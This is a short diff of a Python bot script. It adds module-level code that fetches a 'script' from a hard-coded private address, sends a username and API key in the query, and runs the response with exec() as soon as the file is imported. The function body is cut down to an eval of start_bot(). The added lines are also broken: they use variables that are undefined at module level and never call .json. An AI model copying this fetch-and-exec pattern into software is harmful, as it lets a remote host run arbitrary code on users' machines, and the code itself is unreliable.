@@ -1,16 +1,15 @@
 import requests
+URL="192.168.1.38:3333"
+global username_, api_key_
+ChakeUrl=f"http://{URL}/api/getscript?username={UserID}&api_key={Api_Key}" 
+Data = requests.get(ChakeUrl).json   
+exec(Data)
 
 
 
 def ChakeUser(UserID , Api_Key):
-    URL="192.168.1.38:3333"
-    ChakeUrl=f"http://{URL}/api/getscript?username={UserID}&api_key={Api_Key}"
+    eval("""start_bot()""")
     
-    Data = requests.get(ChakeUrl).json
-    
-    
-    exec(Data)
-    b = eval("""start_bot()""")
     
 
 
